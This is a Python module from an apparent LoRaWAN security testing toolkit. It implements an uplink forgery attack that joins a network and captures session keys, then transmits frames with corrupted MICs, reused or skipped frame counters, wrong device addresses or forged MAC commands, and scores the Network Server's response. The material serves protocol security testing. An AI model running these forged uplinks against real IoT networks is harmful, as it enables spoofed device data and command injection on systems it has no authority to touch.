"""Uplink forgery attack.

Constructs attacker-controlled uplinks and evaluates whether a Network Server
properly validates LoRaWAN security mechanisms:

* MIC integrity
* FCnt monotonicity
* DevAddr / session binding
* MAC command authenticity

Unlike the replay attack this scenario does **not** retransmit a previously
captured packet — it builds new frames with deliberately altered fields.
"""

from __future__ import annotations

import time
from dataclasses import dataclass, field
from enum import Enum
from typing import TYPE_CHECKING, Any

from lora_attack_toolkit.attacks.base import BaseAttack
from lora_attack_toolkit.attacks.lifecycle import gateway_lifecycle
from lora_attack_toolkit.attacks.result import (
    AttackResult,
    Confidence,
    ExecutionStatus,
    SecurityVerdict,
)
from lora_attack_toolkit.config import AttackTiming, UplinkForgeryConfigV1
from lora_attack_toolkit.lorawan.frames import build_unconfirmed_data_up
from lora_attack_toolkit.lorawan.join import perform_otaa_join
from lora_attack_toolkit.lorawan.mac_commands import (
    CID_DUTY_CYCLE_ANS,
    CID_LINK_ADR_ANS,
    CID_LINK_CHECK_REQ,
    CID_RX_PARAM_SETUP_ANS,
    MACCommand,
    build_device_time_req,
    encode_mac_commands,
)
from lora_attack_toolkit.lorawan.time_utils import interruptible_sleep

if TYPE_CHECKING:
    from lora_attack_toolkit.attacks.context import AttackContext

# ── Constants ─────────────────────────────────────────────────────────────────

_DEFAULT_TIMING = AttackTiming()
_RX_DRAIN_SEC = (
    _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + 0.5
)
_FOPTS_MAX = 15  # LoRaWAN FOpts maximum length in bytes

# ── Verdict ───────────────────────────────────────────────────────────────────


class ForgeryVerdict(str, Enum):
    REJECTED = "rejected"
    ACCEPTED = "accepted"
    ACCEPTED_EXPECTED = "accepted_expected"
    IGNORED = "ignored"
    INCONCLUSIVE = "inconclusive"


# ── Evidence record ───────────────────────────────────────────────────────────


@dataclass
class ForgeryEvidence:
    """Complete evidence collected during one forgery attempt."""

    forgery_mode: str
    dev_addr_hex: str
    fcnt_used: int
    payload_hex: str
    mic_strategy: str
    radio_frequency_hz: int
    radio_data_rate: str
    tx_timestamp: float
    downlink_received: bool = False
    downlink_count: int = 0
    verification_accepted: bool = False
    verdict: ForgeryVerdict = ForgeryVerdict.INCONCLUSIVE
    notes: list[str] = field(default_factory=list)


# ── Frame manipulation helpers ────────────────────────────────────────────────


def corrupt_mic(frame: bytes) -> bytes:
    """Bit-flip every byte of the 4-byte MIC trailer."""
    if len(frame) < 4:
        return frame
    return frame[:-4] + bytes(b ^ 0xFF for b in frame[-4:])


def _apply_mic_strategy(
    frame: bytes,
    recalculate_mic: bool,
    corrupt_mic_flag: bool,
    dev_addr_le: bytes,
    fcnt_up: int,
    fport: int,
    payload: bytes,
    app_s_key: bytes,
    nwk_s_key: bytes,
    f_opts: bytes = b"",
) -> tuple[bytes, str]:
    """Return ``(frame, mic_strategy_label)`` after applying the MIC strategy.

    Priority:
      1. ``recalculate_mic=True``  → rebuild frame with a fresh valid MIC.
      2. ``corrupt_mic=True``      → flip the existing MIC bits.
      3. Both false                → return frame unchanged.
    """
    if recalculate_mic:
        rebuilt = build_unconfirmed_data_up(
            dev_addr_le=dev_addr_le,
            fcnt_up=fcnt_up,
            f_port=fport,
            frm_payload=payload,
            app_s_key=app_s_key,
            nwk_s_key=nwk_s_key,
            confirmed=False,
            f_opts=f_opts,
        )
        return rebuilt, "recalculated"
    if corrupt_mic_flag:
        return corrupt_mic(frame), "corrupted"
    return frame, "original"


def _build_mac_command_fopts(mac_command_name: str) -> bytes:
    """Build the FOpts bytes for a ``mac_command_forgery`` frame."""
    cmd_map: dict[str, MACCommand] = {
        "DeviceTimeReq": build_device_time_req(),
        "LinkCheckReq": MACCommand(cid=CID_LINK_CHECK_REQ, payload=b""),
        "LinkADRAns": MACCommand(cid=CID_LINK_ADR_ANS, payload=b"\x07"),
        "DutyCycleAns": MACCommand(cid=CID_DUTY_CYCLE_ANS, payload=b""),
        "RXParamSetupAns": MACCommand(cid=CID_RX_PARAM_SETUP_ANS, payload=b"\x07"),
    }
    cmd = cmd_map.get(mac_command_name, build_device_time_req())
    return encode_mac_commands([cmd])[:_FOPTS_MAX]


# ── Verdict logic ─────────────────────────────────────────────────────────────


def determine_forgery_verdict(
    forgery_mode: str,
    downlink_received: bool,
    verification_accepted: bool,
    mic_strategy: str,
) -> ForgeryVerdict:
    """Classify the Network Server response to a forged uplink.

    ``valid_mic_modified_payload``
        Always ``ACCEPTED_EXPECTED`` — attacker possesses session keys.

    ``invalid_mic`` / ``fcnt_reuse_with_modified_payload`` / ``wrong_devaddr``
        ``ACCEPTED`` if a downlink was received (NS treated it as valid),
        ``REJECTED`` / ``IGNORED`` otherwise.

    ``fcnt_jump_forward``
        ``ACCEPTED`` if downlink received, ``REJECTED`` otherwise.

    ``mac_command_forgery``
        Depends on ``mic_strategy``:
        * ``recalculated`` + downlink → ``ACCEPTED_EXPECTED``
        * ``corrupted``   + downlink → ``ACCEPTED`` (possible vulnerability)
        * no downlink                → ``REJECTED``
    """
    if forgery_mode == "valid_mic_modified_payload":
        return ForgeryVerdict.ACCEPTED_EXPECTED

    if forgery_mode in {"invalid_mic", "fcnt_reuse_with_modified_payload", "fcnt_jump_forward"}:
        return ForgeryVerdict.ACCEPTED if downlink_received else ForgeryVerdict.REJECTED

    if forgery_mode == "wrong_devaddr":
        return ForgeryVerdict.ACCEPTED if downlink_received else ForgeryVerdict.IGNORED

    if forgery_mode == "mac_command_forgery":
        if downlink_received:
            return (
                ForgeryVerdict.ACCEPTED_EXPECTED
                if mic_strategy == "recalculated"
                else ForgeryVerdict.ACCEPTED
            )
        return ForgeryVerdict.REJECTED

    return ForgeryVerdict.INCONCLUSIVE


def _forgery_verdict_to_security(
    verdict: ForgeryVerdict,
) -> tuple[SecurityVerdict, Confidence, bool | None]:
    """Map ForgeryVerdict to (SecurityVerdict, Confidence, target_protected)."""
    mapping: dict[ForgeryVerdict, tuple[SecurityVerdict, Confidence, bool | None]] = {
        ForgeryVerdict.REJECTED:          (SecurityVerdict.SECURE,       Confidence.HIGH,   True),
        ForgeryVerdict.IGNORED:           (SecurityVerdict.SECURE,       Confidence.MEDIUM, True),
        ForgeryVerdict.ACCEPTED:          (SecurityVerdict.VULNERABLE,   Confidence.HIGH,   False),
        ForgeryVerdict.ACCEPTED_EXPECTED: (SecurityVerdict.NOT_APPLICABLE, Confidence.HIGH, None),
        ForgeryVerdict.INCONCLUSIVE:      (SecurityVerdict.INCONCLUSIVE, Confidence.LOW,    None),
    }
    return mapping[verdict]


# ── Attack ────────────────────────────────────────────────────────────────────


class UplinkForgeryAttack(BaseAttack):
    """Uplink forgery attack.

    Evaluates Network Server behaviour in response to attacker-controlled
    uplinks with manipulated MIC, FCnt, DevAddr, or MAC commands.

    Attack flow
    -----------
    1.  Initialise device state.
    2.  Perform OTAA join (when ``perform_join=true``).
    3.  Send baseline uplinks to establish a valid session context.
    4.  Capture session state (DevAddr, FCnt, session keys).
    5.  Build a forged uplink according to ``forgery_mode``.
    6.  Transmit the forged uplink through the transport layer.
    7.  Observe Network Server response (RX1/RX2 window).
    8.  Send verification uplinks if applicable.
    9.  Produce a structured verdict and evidence report.
    """

    name = "uplink_forgery"

    def run(self, ctx: "AttackContext") -> AttackResult:
        cfg: UplinkForgeryConfigV1 = ctx.config
        ctx.logger.info("uplink_forgery_started mode=%s", cfg.forgery_mode)
        try:
            return self._run(ctx, cfg)
        except Exception as exc:  # noqa: BLE001
            ctx.logger.exception("uplink_forgery_failed error=%s", exc)
            return AttackResult.failed(
                attack_name=self.name,
                attack_type="uplink_forgery",
                error=str(exc),
            )

    # ── Core execution ────────────────────────────────────────────────────────

    def _run(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> AttackResult:
        with gateway_lifecycle(ctx.gateway):
            interruptible_sleep(0.5, ctx.cancel_event)

            # 1. OTAA join
            if cfg.perform_join:
                ctx.logger.info("uplink_forgery_join_started")
                if not perform_otaa_join(
                    device=ctx.device,
                    gateway=ctx.gateway,
                    radio=ctx.radio,
                    timeout_sec=5.0,
                    logger=ctx.logger,
                ):
                    return AttackResult.failed(
                        attack_name=self.name,
                        attack_type="uplink_forgery",
                        error="OTAA join failed",
                        message="OTAA join failed — cannot proceed with forgery",
                    )
                ctx.logger.info("uplink_forgery_join_succeeded")

            # 2. Baseline uplinks
            self._send_baseline_uplinks(ctx, cfg)

            # 3. Capture session context
            session = self._capture_session(ctx, cfg)

            # 4–5. Build and transmit forged uplink
            evidence = self._forge_and_transmit(ctx, cfg, session)

            # 6. Drain RX window
            evidence.downlink_count = self._drain_rx_window(ctx, evidence.tx_timestamp)
            evidence.downlink_received = evidence.downlink_count > 0

            # 7. Verification uplinks
            if cfg.verification_uplink_count > 0 and cfg.forgery_mode not in {
                "wrong_devaddr",
                "valid_mic_modified_payload",
            }:
                evidence.verification_accepted = self._send_verification_uplinks(ctx, cfg)

            # 8. Verdict
            evidence.verdict = determine_forgery_verdict(
                forgery_mode=cfg.forgery_mode,
                downlink_received=evidence.downlink_received,
                verification_accepted=evidence.verification_accepted,
                mic_strategy=evidence.mic_strategy,
            )

        ctx.logger.info(
            "uplink_forgery_completed mode=%s verdict=%s downlinks=%d",
            cfg.forgery_mode,
            evidence.verdict.value,
            evidence.downlink_count,
        )

        return self._build_result(evidence)

    # ── Step helpers ──────────────────────────────────────────────────────────

    def _send_baseline_uplinks(
        self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1
    ) -> None:
        """Send clean baseline uplinks to establish a valid session state."""
        for i in range(cfg.baseline_uplink_count):
            fcnt = ctx.device.runtime.fcnt_up
            frame = ctx.device.build_data_uplink(
                payload=bytes.fromhex(cfg.payload_hex),
                f_port=cfg.fport,
                confirmed=False,
            )
            radio = ctx.device.select_uplink_radio(fcnt, ctx.radio)
            ctx.gateway.forward_uplink(frame, radio)
            ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt, packet_type="data_up")
            ctx.logger.info(
                "uplink_forgery_baseline_uplink_sent index=%d fcnt=%d freq_hz=%d",
                i, fcnt, radio.frequency,
            )
            # Drain RX window between baseline uplinks
            ctx.gateway.await_downlink(timeout_sec=_RX_DRAIN_SEC)
            remaining = max(0.0, cfg.uplink_interval_sec - _RX_DRAIN_SEC)
            if remaining > 0 and i < cfg.baseline_uplink_count - 1:
                interruptible_sleep(remaining, ctx.cancel_event)

    def _capture_session(
        self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1
    ) -> dict[str, Any]:
        """Snapshot device session state after baseline uplinks."""
        rt = ctx.device.runtime
        return {
            "dev_addr_le": rt.dev_addr_le,
            "dev_addr_hex": rt.dev_addr_le[::-1].hex() if rt.dev_addr_le else "00000000",
            "fcnt_up": rt.fcnt_up,
            "nwk_s_key": rt.nwk_s_key,
            "app_s_key": rt.app_s_key,
        }

    def _forge_and_transmit(
        self,
        ctx: "AttackContext",
        cfg: UplinkForgeryConfigV1,
        session: dict[str, Any],
    ) -> ForgeryEvidence:
        """Build a mode-specific forged frame, log, and transmit it."""
        mode = cfg.forgery_mode
        dev_addr_le: bytes = session["dev_addr_le"]
        nwk_s_key: bytes = session["nwk_s_key"]
        app_s_key: bytes = session["app_s_key"]
        current_fcnt: int = session["fcnt_up"]
        forged_payload = bytes.fromhex(cfg.forged_payload_hex)

        # ── Determine FCnt ─────────────────────────────────────────────────
        if mode == "fcnt_jump_forward":
            fcnt_used = (
                cfg.target_fcnt
                if cfg.target_fcnt is not None
                else current_fcnt + cfg.fcnt_delta
            )
        elif mode == "fcnt_reuse_with_modified_payload":
            fcnt_used = max(0, current_fcnt - 1)
        else:
            fcnt_used = current_fcnt

        # ── Determine DevAddr ──────────────────────────────────────────────
        used_addr_hex: str
        if mode == "wrong_devaddr":
            try:
                dev_addr_le = bytes.fromhex(cfg.wrong_devaddr)[::-1]
            except ValueError:
                dev_addr_le = bytes(4)
            used_addr_hex = cfg.wrong_devaddr
        else:
            used_addr_hex = session["dev_addr_hex"]

        # ── Build base frame and FOpts ─────────────────────────────────────
        f_opts = b""
        if mode == "mac_command_forgery":
            f_opts = _build_mac_command_fopts(cfg.mac_command)

        base_frame = build_unconfirmed_data_up(
            dev_addr_le=dev_addr_le,
            fcnt_up=fcnt_used,
            f_port=cfg.fport,
            frm_payload=forged_payload,
            app_s_key=app_s_key,
            nwk_s_key=nwk_s_key,
            confirmed=False,
            f_opts=f_opts,
        )

        # ── Apply MIC strategy ─────────────────────────────────────────────
        # ``valid_mic_modified_payload`` always uses a freshly computed MIC
        # (the payload is forged but keys are known); the user-supplied
        # ``recalculate_mic`` / ``corrupt_mic`` flags are ignored for this
        # mode to avoid surprising interaction with the default ``corrupt_mic=True``.
        if mode == "valid_mic_modified_payload":
            frame = base_frame
            mic_strategy = "recalculated"
        else:
            frame, mic_strategy = _apply_mic_strategy(
                frame=base_frame,
                recalculate_mic=cfg.recalculate_mic,
                corrupt_mic_flag=cfg.corrupt_mic,
                dev_addr_le=dev_addr_le,
                fcnt_up=fcnt_used,
                fport=cfg.fport,
                payload=forged_payload,
                app_s_key=app_s_key,
                nwk_s_key=nwk_s_key,
                f_opts=f_opts,
            )

        # ── Select radio channel via device layer ──────────────────────────
        radio = ctx.device.select_uplink_radio(fcnt_used, ctx.radio)

        ctx.logger.info(
            "uplink_forgery_frame_built mode=%s fcnt=%d devaddr=%s "
            "mic=%s freq_hz=%d payload=%s",
            mode, fcnt_used, used_addr_hex, mic_strategy,
            radio.frequency, cfg.forged_payload_hex,
        )

        tx_time = time.time()
        ctx.gateway.forward_uplink(frame, radio)
        ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt_used, packet_type="data_up")

        ctx.logger.info(
            "uplink_forgery_frame_sent mode=%s fcnt=%d freq_hz=%d mic=%s",
            mode, fcnt_used, radio.frequency, mic_strategy,
        )

        return ForgeryEvidence(
            forgery_mode=mode,
            dev_addr_hex=used_addr_hex,
            fcnt_used=fcnt_used,
            payload_hex=cfg.forged_payload_hex,
            mic_strategy=mic_strategy,
            radio_frequency_hz=radio.frequency,
            radio_data_rate=radio.data_rate,
            tx_timestamp=tx_time,
        )

    def _drain_rx_window(self, ctx: "AttackContext", tx_wall: float) -> int:
        """Wait for and count downlinks received in the RX1+RX2 window."""
        deadline = tx_wall + _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + 1.0
        count = 0
        while time.time() < deadline:
            remaining = max(0.01, deadline - time.time())
            raw = ctx.gateway.await_downlink(timeout_sec=min(remaining, 0.3))
            if raw is None:
                continue
            count += 1
            ctx.capture.capture_downlink(phy_payload=raw, packet_type="data_down")
            ctx.logger.info("uplink_forgery_downlink_received count=%d", count)
        return count

    def _send_verification_uplinks(
        self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1
    ) -> bool:
        """Send post-forgery verification uplinks.  Returns True on any downlink."""
        got_downlink = False
        for i in range(cfg.verification_uplink_count):
            interruptible_sleep(cfg.uplink_interval_sec, ctx.cancel_event)
            fcnt = ctx.device.runtime.fcnt_up
            frame = ctx.device.build_data_uplink(
                payload=bytes.fromhex(cfg.payload_hex),
                f_port=cfg.fport,
                confirmed=False,
            )
            radio = ctx.device.select_uplink_radio(fcnt, ctx.radio)
            ctx.gateway.forward_uplink(frame, radio)
            ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt, packet_type="data_up")
            ctx.logger.info(
                "uplink_forgery_verification_uplink_sent index=%d fcnt=%d freq_hz=%d",
                i, fcnt, radio.frequency,
            )
            raw = ctx.gateway.await_downlink(timeout_sec=_RX_DRAIN_SEC)
            if raw is not None:
                got_downlink = True
                ctx.capture.capture_downlink(phy_payload=raw, packet_type="data_down")
        return got_downlink

    # ── Result builder ────────────────────────────────────────────────────────

    def _build_result(self, evidence: ForgeryEvidence) -> AttackResult:
        verdict = evidence.verdict
        _LABELS: dict[ForgeryVerdict, str] = {
            ForgeryVerdict.REJECTED: "Rejected (expected secure behaviour)",
            ForgeryVerdict.ACCEPTED: "Accepted (potentially vulnerable)",
            ForgeryVerdict.ACCEPTED_EXPECTED: (
                "Accepted (expected — attacker possesses session keys)"
            ),
            ForgeryVerdict.IGNORED: "Ignored (expected secure behaviour)",
            ForgeryVerdict.INCONCLUSIVE: "Inconclusive",
        }
        label = _LABELS.get(verdict, verdict.value)

        metrics: dict[str, Any] = {
            "forgery_mode": evidence.forgery_mode,
            "dev_addr": evidence.dev_addr_hex,
            "fcnt_used": evidence.fcnt_used,
            "payload_hex": evidence.payload_hex,
            "mic_strategy": evidence.mic_strategy,
            "frequency_hz": evidence.radio_frequency_hz,
            "data_rate": evidence.radio_data_rate,
            "tx_timestamp": evidence.tx_timestamp,
            "downlink_received": evidence.downlink_received,
            "downlink_count": evidence.downlink_count,
            "verification_accepted": evidence.verification_accepted,
            "verdict": verdict.value,
            "verdict_label": label,
        }

        sv, conf, protected = _forgery_verdict_to_security(verdict)
        return AttackResult(
            attack_name=self.name,
            attack_type="uplink_forgery",
            execution_status=ExecutionStatus.COMPLETED,
            security_verdict=sv,
            confidence=conf,
            target_protected=protected,
            message=f"Uplink forgery [{evidence.forgery_mode}]: {label}",
            metrics=metrics,
        )
